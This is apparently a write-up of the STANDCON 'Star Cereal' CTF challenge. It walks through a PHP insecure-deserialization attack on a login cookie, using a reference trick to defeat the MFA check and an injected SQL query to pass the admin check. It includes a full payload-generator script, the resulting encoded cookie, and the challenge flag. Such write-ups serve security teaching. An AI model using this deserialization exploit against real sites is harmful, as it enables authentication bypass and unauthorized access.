---
title: STANDCON CTF - Star Cereal
date: 2021-08-02 17:19:00 +0800
categories: [ctf]
tags: [php, deserialization, sqli]
---

# Description

> Have you heard of Star Cereal? It's a new brand of cereal that's been rapidly gaining popularity amongst astronauts - so much so that their devs had to scramble to piece together a website for their business! The stress must have really gotten to them though, because a junior dev accidentally leaked part of the source code...
> 
> `http://20.198.209.142:55043`
> 
> _The flag is in the flag format: STC{...}_
> 
> **Author: zeyu2001**

# Solution

![](/assets/images/cereal_1.jpg)

By clicking on the `Login` button on the top right,

![]((/assets/images/cereal_2.jpg)

We are presented with a login page (`/login.php`). What caught our eye as the `MFA Token` field. `MFA` stood for `Multi-Factor Authentication`, which we would mean that other than submitting an email and password, we would need submit a token, which only the user knows or can generate. We might even need to bypass the check of the `MFA` token.

We are provide with the following `process_login.php`, which seems like the backend code that handles the authentication and authorization.

```php
<?php

class SQL
{
    protected $query;

    function __construct()
    {
        $this->query = "SELECT email, password FROM admins WHERE email=? AND password=?";
    }

    function exec_query($email, $pass)
    {
        $conn = new mysqli("db", getenv("MYSQL_USER"), getenv("MYSQL_PASS"));

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed. Please inform CTF creators.");
        }
        
        $stmt = $conn->prepare($this->query);

        // Sanity check
        if (! $stmt->bind_param("ss", $email, $pass))
        {
            return NULL;
        }
        
        $stmt->execute();
        $result = $stmt->get_result();
        
        return $result;
    }

    }


class User
{
    public $email;
    public $password;

    protected $sql;

    function __construct($email, $password)
    {
        $this->email = $email;
        $this->password = $password;
        $this->sql = new SQL();
    }

    function __toString() 
    {
        return $this->email . ':' . $this->password;
    }

    function is_admin()
    {
        $result = $this->sql->exec_query($this->email, $this->password);
        
        if ($result && $row = $result->fetch_assoc()) {
            if ($row['email'] && $row['password'])
            {
                return true;
            }
        }
        return false;
    }
}


class Login
{
    public $user;
    public $mfa_token;

    protected $_correctValue;

    function __construct($user, $mfa_token)
    {
        $this->user = $user;
        $this->mfa_token = $mfa_token;
    }

    function verifyLogin()
    {
        $this->_correctValue = random_int(1e10, 1e11 - 1);
        if ($this->mfa_token === $this->_correctValue)
        {
            return $this->user->is_admin();
        }
    }
}


// Verify login
if(isset($_COOKIE["login"])){
    try
    {
        $login = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        if ($login->verifyLogin())
        {
            $_SESSION['admin'] = true;
        }
        else
        {
            $_SESSION['admin'] = false;
        }
    }
    catch (Error $e)
    {
        $_SESSION['admin'] = false;
    }
}


// Handle form submission
if (isset($_POST['email']) && isset($_POST['pass']) && isset($_POST['token']))
{
    $login = new Login(new User($_POST['email'], $_POST['pass']), $_POST['token']);
    setcookie("login", urlencode(base64_encode(serialize($login))), time() + (86400 * 30), "/");
    header("Refresh:0");
    die();
}

?>
```

We can immediately notice the usage of the dangerous `serialize` and `unserialize` functions, which presents a possible attack vector via `Insecure Deserialization`. 

```php
$login = unserialize(base64_decode(urldecode($_COOKIE["login"])));
setcookie("login", urlencode(base64_encode(serialize($login))), time() + (86400 * 30), "/");
```

Drilling down into the code,  

## `unserialize()`

```php
$login = unserialize(base64_decode(urldecode($_COOKIE["login"])));
if ($login->verifyLogin())
{
    $_SESSION['admin'] = true;
}
else
{
    $_SESSION['admin'] = false;
}
```

We see that the page will automatically call `unserialize` on the `base64` `url-decoded` value in the `login` cookie and call the deserialized object's `verifyLogin()` method, which would mean the `$login` object is a `Login` object. Let's look at the `Login`'s properties and `verifyLogin()`:

## `Login->verifyLogin()`

```php
class Login
{
    public $user;
    public $mfa_token;

    protected $_correctValue;
    ...
    function verifyLogin()
    {
        $this->_correctValue = random_int(1e10, 1e11 - 1);
        if ($this->mfa_token === $this->_correctValue)
        {
            return $this->user->is_admin();
        }
    }
```

Inside `verifyLogin()`, a random large integer between `1e10` and `1e11` is generated, stored as `_correctValue` and then if `_correctValue` is the same as `mfa_token`, it will then proceed to call `user`'s `is_admin()` method.

This might seem foolproof at first as there is no way to predict or even brute force the number generated, but according to this [`writeup`](https://zeyu2001.gitbook.io/ctfs/2021/midnight-sun-ctf/corporate-mfa#solution) found on the Internet, we could force the `mfa_token` to be a reference to the `_correctValue`.

```php
class Login
{
    public $user;
    public $mfa_token;
	
    protected $_correctValue;
	
    function __construct($user, $mfa_token)
    {
        $this->user = $user;
        $this->mfa_token = &$this->_correctValue;
    }
    function verifyLogin()
    ...
}
```

When `verifyLogin()` is called, the `_correctValue` is populated with the random large integer and because `mfa_token` references `_correctValue`, they will always share the same value!

Next, we look at the `is_admin()` method of the `User` class:

## `User->is_admin()`

```php
class User
{
    public $email;
    public $password;

    protected $sql;
    ...
    function is_admin()
    {
        $result = $this->sql->exec_query($this->email, $this->password);
        
        if ($result && $row = $result->fetch_assoc()) {
            if ($row['email'] && $row['password'])
            {
                return true;
            }
        }
        return false;
    }
}
```

A `User` object will contain an instance of the `SQL` class and the `is_admin()` function will call the `SQL` object's `exec_query()`, which seems to be used to query the database and check if the email and password are valid.

## `SQL->exec_query()`

```php
class SQL
{
    protected $query;

    function __construct()
    {
        $this->query = "SELECT email, password FROM admins WHERE email=? AND password=?";
    }

    function exec_query($email, $pass)
    {
        $conn = new mysqli("db", getenv("MYSQL_USER"), getenv("MYSQL_PASS"));

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed. Please inform CTF creators.");
        }
        
        $stmt = $conn->prepare($this->query);

        // Sanity check
        if (! $stmt->bind_param("ss", $email, $pass))
        {
            return NULL;
        }
        
        $stmt->execute();
        $result = $stmt->get_result();
        
        return $result;
    }
}
```

We see that the SQL query is stored in `query` and the `exec_query()` method uses `bind_param()` to set the email and password in the query before executing it. While we do not know any valid email or passwords, we could replace the contents of `query` with our own custom query while making sure that are 2 `?`s inside of it.

```php
class SQL
{
    protected $query;

    function __construct()
    {
        $this->query = "SELECT ? as email,? as password,SLEEP(5)";
    }
    function exec_query($email, $pass)
    ...
}
```

I've added a `SLEEP(5)` so that we would be able to observe a delay to ascertain that our query is being executed.

## Payload creation

To put it all together, I used the following script to create the cookie we need.

```php
$ cat cereal.php
<?php
class SQL
{
    protected $query;
    
    function __construct()
    {
        $this->query = "SELECT ? as email,? as password,SLEEP(5)";
    }
}

class User
{
    public $email;
    public $password;

    protected $sql;

    function __construct($email, $password)
    {
        $this->email = $email;
        $this->password = $password;
        $this->sql = new SQL();
    }
}

class Login
{
    public $user;
    public $mfa_token;

    protected $_correctValue;

    function __construct($user, $mfa_token)
    {
        $this->user = $user;
        $this->mfa_token = &$this->_correctValue;
    }
}

$loginAttempt = new Login(new User("admin@admin.com", "password"), -1);
$output = urlencode(base64_encode(serialize($loginAttempt)));
var_dump($output);
?>


$ php cereal.php
string(326) "Tzo1OiJMb2dpbiI6Mzp7czo0OiJ1c2VyIjtPOjQ6IlVzZXIiOjM6e3M6NToiZW1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo4OiJwYXNzd29yZCI7czo4OiJwYXNzd29yZCI7czo2OiIAKgBzcWwiO086MzoiU1FMIjoxOntzOjg6IgAqAHF1ZXJ5IjtzOjQwOiJTRUxFQ1QgPyBhcyBlbWFpbCw%2FIGFzIHBhc3N3b3JkLFNMRUVQKDUpIjt9fXM6OToibWZhX3Rva2VuIjtOO3M6MTY6IgAqAF9jb3JyZWN0VmFsdWUiO1I6Nzt9"
```

We can then take this long string and add it as a `login` cookie to our browser and refresh the page.

We would notice a 5 seconds delay due to the `SLEEP(5)`, and we would be presented with the flag!

# Flag
`STC{1ns3cur3_d3s3r14l1z4t10n_7b20b860e23a128688cffc07a5b7e898}`